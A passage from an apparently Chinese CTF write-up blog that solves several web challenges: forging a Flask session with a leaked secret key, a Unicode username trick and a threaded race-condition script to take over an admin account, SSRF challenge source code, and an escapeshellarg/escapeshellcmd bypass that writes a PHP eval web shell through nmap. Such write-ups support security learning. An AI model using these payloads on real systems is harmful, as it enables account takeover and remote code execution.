<span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, title = <span class="string">&#x27;login&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/logout&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/edit&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;post successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, title = <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    title = unicode(error)</span><br><span class="line">    message = error.description</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;errors.html&#x27;</span>, title=title, message=message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>åœ¨<code>config.py</code>çœ‹åˆ°secret_key,å¯ä»¥è€ƒè™‘sessionä¼ªé€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="params">object</span>):</span></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>flask sessionåŠ å¯†è§£å¯†å·¥å…·githubåœ°å€ï¼š<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_manager.py decode -c -s </span><br><span class="line"><span class="comment"># -cæ˜¯flask cookieé‡Œçš„sessionå€¼ -så‚æ•°æ˜¯SECRET_KEY</span></span><br><span class="line">python flask_session_manager.py encode -s -t </span><br><span class="line"><span class="comment"># -så‚æ•°æ˜¯SECRET_KEY -tå‚æ•°sessionè§£å¯†åçš„æ ¼å¼</span></span><br></pre></td></tr></table></figure><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIMæˆªå›¾20200503104534.png" style="zoom:80%;"><p>æ›¿æ¢å°±å¯ä»¥å¾—åˆ°flagï¼Œå…¶å®å¯ä»¥ä¸ç”¨è¿™ä¹ˆé•¿çš„sessionï¼Œç›´æ¥ä¸‹é¢è¿™æ ·ä¹Ÿè¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager2.py encode -s ckj123 -t <span class="string">&quot;&#123;u&#x27;user_id&#x27;: u&#x27;10&#x27;, u&#x27;name&#x27;: u&#x27;admin&#x27;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>è¿™é¢˜è¿˜å¯ä»¥ç”¨unicodeæ¬ºéª—ï¼Œä¸éš¾å‘ç°ç™»é™†æ³¨å†Œé¡µé¢å¯¹<code>session[&#39;name&#39;]</code>çš„æ“ä½œéƒ½è¿›è¡Œäº†<code>strlower</code>å‡½æ•°çš„æ“ä½œ,è€Œstrloweråˆå¦‚ä¸‹è°ƒç”¨äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="keyword">import</span> nodeprep</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>åœ¨<code>requirements.txt</code>çœ‹åˆ°twistedçš„ç‰ˆæœ¬æ˜¯<code>10.2.0</code>ï¼Œç›®å‰ç‰ˆæœ¬éƒ½<code>20.3.0</code>äº†ï¼Œåˆšå¥½è¯¥ç‰ˆæœ¬å­˜åœ¨æ¼æ´</p><p>nodeprep.prepareå‡½æ•°ä¼šå°†unicodeå­—ç¬¦<code>á´¬</code>è½¬æ¢æˆ<code>A</code>ï¼Œè€Œ<code>A</code>åœ¨è°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°ä¼šæŠŠ<code>A</code>è½¬æ¢æˆ<code>a</code></p><p>æ‰€ä»¥æˆ‘ä»¬æ³¨å†Œ<code>á´¬dmin</code>æ­¤æ—¶è°ƒç”¨ä¸€æ¬¡å˜æˆ<code>Admin</code>ï¼Œå†ä¿®æ”¹ä¸€æ¬¡å¯†ç å°±èƒ½å†è°ƒç”¨ä¸€æ¬¡å˜æˆ<code>admin</code>,æ­¤æ—¶ä¿®æ”¹çš„å°±æ˜¯adminçš„å¯†ç ï¼Œè¿™ç§æ–¹æ³•ä¹Ÿèƒ½getflag</p><p>è¿™é¢˜è¿˜èƒ½ç”¨æ¡ä»¶ç«äº‰çš„æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ç™»é™†å’Œæ”¹å¯†ç æ“ä½œåœ¨æ²¡æœ‰å®Œå…¨checkèº«ä»½çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œäº†sessionæœ‰å…³çš„èµ‹å€¼</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨æ¡ä»¶ç«äº‰çš„æ–¹æ³•ï¼Œä¸€ä¸ªæ”¹å¯†ç ï¼Œä¸€ä¸ªé€€å‡ºç™»é™†å¹¶ä»¥adminç™»é™†ï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">s, username, password</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">&quot;http://admin.2018.hctf.io/login&quot;</span>, data=data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">&quot;http://admin.2018.hctf.io/logout&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">s, newpassword</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;newpassword&#x27;</span>:newpassword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">&quot;http://admin.2018.hctf.io/change&quot;</span>, data=data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span>(<span class="params">s</span>):</span></span><br><span class="line">    login(s, <span class="string">&#x27;skysec&#x27;</span>, <span class="string">&#x27;skysec&#x27;</span>)</span><br><span class="line">    change(s, <span class="string">&#x27;skysec&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span>(<span class="params">s</span>):</span></span><br><span class="line">    logout(s)</span><br><span class="line">    res = login(s, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;skysec&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">&#x27;finish&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class="line">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><h3 id="writeup-3"><a href="#writeup-3" class="headerlink" title="writeup"></a>writeup</h3><p>æ‰“å¼€å‘ç°æœ‰æºç ,æ•´ç†ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="comment">#encoding=utf-8 </span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request </span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys) </span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>) </span><br><span class="line">app = Flask(__name__) </span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>) </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span> </span><br><span class="line">self.action = action </span><br><span class="line">self.param = param </span><br><span class="line">self.sign = sign </span><br><span class="line">self.sandbox = md5(ip) </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)): </span><br><span class="line"><span class="comment">#SandBox For Remote_Addr </span></span><br><span class="line">os.mkdir(self.sandbox) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span> </span><br><span class="line">result = &#123;&#125; </span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span> </span><br><span class="line"><span class="keyword">if</span> (self.checkSign()): </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action: </span><br><span class="line">tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>) </span><br><span class="line">resp = scan(self.param) </span><br><span class="line"><span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>): </span><br><span class="line">result[<span class="string">&#x27;data&#x27;</span>] = resp </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="keyword">print</span> resp tmpfile.write(resp) </span><br><span class="line">tmpfile.close() </span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span> </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action: </span><br><span class="line">f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>) </span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span> </span><br><span class="line">result[<span class="string">&#x27;data&#x27;</span>] = f.read() </span><br><span class="line"><span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>: </span><br><span class="line">result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span> </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span> </span><br><span class="line">result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span> </span><br><span class="line"><span class="keyword">return</span> result </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span> </span><br><span class="line"><span class="keyword">if</span> (getSign(self.action, self.param) == self.sign): </span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"><span class="comment">#generate Sign For Action Scan. </span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span> </span><br><span class="line">param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)) </span><br><span class="line">action = <span class="string">&quot;scan&quot;</span> </span><br><span class="line"><span class="keyword">return</span> getSign(action, param) </span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;]) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span> </span><br><span class="line">action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>)) </span><br><span class="line">param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)) </span><br><span class="line">sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>)) </span><br><span class="line">ip = request.remote_addr </span><br><span class="line"><span class="keyword">if</span>(waf(param)): </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span> </span><br><span class="line">task = Task(action, param, sign, ip) </span><br><span class="line"><span class="keyword">return</span> json.dumps(task.Exec()) </span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span> </span><br><span class="line"><span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read() </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span> </span><br><span class="line">socket.setdefaulttimeout(<span class="number">1</span>) </span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line"><span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>] </span><br><span class="line"><span class="keyword">except</span>: </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span> </span><br><span class="line"><span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest() </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span> </span><br><span class="line"><span class="keyword">return</span> hashlib.md5(content).hexdigest() </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span> </span><br><span class="line">check=param.strip().lower() </span><br><span class="line"><span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>): </span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">app.debug = <span class="literal">False</span> </span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>) </span><br></pre></td></tr></table></figure><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><h3 id="writeup-4"><a href="#writeup-4" class="headerlink" title="writeup"></a>writeup</h3><p>è®¿é—®å¾—åˆ°æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>escapeshellargå‡½æ•°:</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIMæˆªå›¾20200503152048.png" style="zoom: 67%;"><p>escapeshellcmdå‡½æ•°ï¼š</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIMæˆªå›¾20200503152213.png" style="zoom:67%;"><p>è¿™ä¸¤ä¸ªå‡½æ•°æœ¬èº«æ˜¯æ²¡ä»€ä¹ˆé—®é¢˜çš„ï¼Œä½†æ˜¯å¦‚æœæ”¾åœ¨ä¸€èµ·ç”¨ï¼Œå°±å¯èƒ½é€ æˆæ¼æ´</p><p>å‡è®¾æˆ‘ä»¬ä¼ å…¥<code>?host=127.0.0.1&#39;</code>ï¼Œä»¥linuxä¸ºä¾‹(Windowsä¼šä¸åŒ)ï¼Œæœªå¤„ç†å‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>ç»è¿‡escapeshellargå‡½æ•°ï¼Œå…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>ç»è¿‡escapeshellcmdå‡½æ•°ï¼Œ<code>\</code>ä¼šè¢«è½¬ä¹‰ï¼Œæœ€åä¸€ä¸ª<code>&#39;</code>ç”±äºä¸åŒ¹é…ä¹Ÿè¢«è½¬ä¹‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\\<span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æ‰§è¡Œçš„å°±æ˜¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F <span class="string">&#x27;127.0.0.1&#x27;</span>\\<span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>ç›¸å½“äº,æˆå¯¹çš„<code>&#39;</code>å¯ä»¥å»æ‰æ‰ï¼Œ<code>\\</code>è½¬ä¹‰æˆ<code>\</code>ï¼Œ<code>\&#39;</code>è½¬ä¹‰æˆ<code>&#39;</code>ï¼Œæœ€ç»ˆï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F 127.0.0.1\<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">&#x27; &lt;?php @eval($_POST[1]);?&gt; -oG hack.php &#x27;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ‰§è¡Œçš„å°±æ˜¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F <span class="string">&#x27;&#x27;</span>\\<span class="string">&#x27;&#x27;</span> \&lt;\?php @<span class="built_in">eval</span>\(\<span class="variable">$_POST</span>\[1\]\)\;\?\&gt; -oG hack.php <span class="string">&#x27;\\&#x27;</span><span 